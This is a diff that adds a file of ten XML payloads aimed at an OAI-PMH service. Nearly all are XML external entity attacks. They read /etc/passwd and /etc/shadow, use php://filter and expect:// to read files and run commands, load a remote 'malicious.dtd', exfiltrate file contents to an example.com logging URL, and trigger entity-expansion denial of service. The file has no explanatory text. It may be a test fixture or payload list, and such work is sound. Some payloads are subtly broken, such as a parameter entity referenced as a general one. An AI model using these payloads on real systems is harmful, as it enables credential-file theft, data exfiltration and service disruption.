@@ -1,0 +1,85 @@
+<?xml version="1.0"?>
+<!DOCTYPE OAI-PMH [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<OAI-PMH>
+  <request verb="Identify">&xxe;</request>
+</OAI-PMH>
+
+<?xml version="1.0"?>
+<!DOCTYPE OAI-PMH [
+  <!ENTITY xxe SYSTEM "file:///etc/shadow">
+]>
+<OAI-PMH>
+  <request verb="Identify">&xxe;</request>
+</OAI-PMH>
+
+<?xml version="1.0"?>
+<!DOCTYPE OAI-PMH [
+  <!ENTITY xxe SYSTEM "https://example.com/secret.txt">
+]>
+<OAI-PMH>
+  <request verb="ListSets">&xxe;</request>
+</OAI-PMH>
+
+<?xml version="1.0"?>
+<!DOCTYPE OAI-PMH [
+  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+]>
+<OAI-PMH>
+  <request verb="Identify">&xxe;</request>
+</OAI-PMH>
+
+<?xml version="1.0"?>
+<!DOCTYPE OAI-PMH [
+  <!ENTITY % ext SYSTEM "http://example.com/malicious.dtd">
+  %ext;
+]>
+<OAI-PMH>
+  <request verb="ListRecords">&malicious;</request>
+</OAI-PMH>
+
+<?xml version="1.0"?>
+<!DOCTYPE OAI-PMH [
+  <!ENTITY xxe SYSTEM "data:text/plain;base64,aGVsbG8gd29ybGQ=">
+]>
+<OAI-PMH>
+  <request verb="GetRecord">&xxe;</request>
+</OAI-PMH>
+
+<?xml version="1.0"?>
+<!DOCTYPE OAI-PMH [
+  <!ENTITY xxe SYSTEM "expect://ls">
+]>
+<OAI-PMH>
+  <request verb="Identify">&xxe;</request>
+</OAI-PMH>
+
+<?xml version="1.0"?>
+<!DOCTYPE OAI-PMH [
+  <!ENTITY xxe SYSTEM "https://example.com/large.xml">
+]>
+<OAI-PMH>
+  <request verb="ListIdentifiers">&xxe;</request>
+</OAI-PMH>
+
+<?xml version="1.0"?>
+<!DOCTYPE OAI-PMH [
+  <!ENTITY lol1 "lol">
+  <!ENTITY lol2 "&lol1;&lol1;&lol1;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;">
+  <!ENTITY lol4 "&lol3;&lol3;&lol3;">
+  <!ENTITY lol5 "&lol4;&lol4;&lol4;">
+]>
+
+<OAI-PMH>
+  <request verb="Identify">&lol5;</request>
+</OAI-PMH>
+
+<?xml version="1.0"?>
+<!DOCTYPE OAI-PMH [
+  <!ENTITY % xxe SYSTEM "https://example.com/log?info=file:///etc/passwd">
+]>
+<OAI-PMH>
+  <request verb="Identify">&xxe;</request>
+</OAI-PMH>
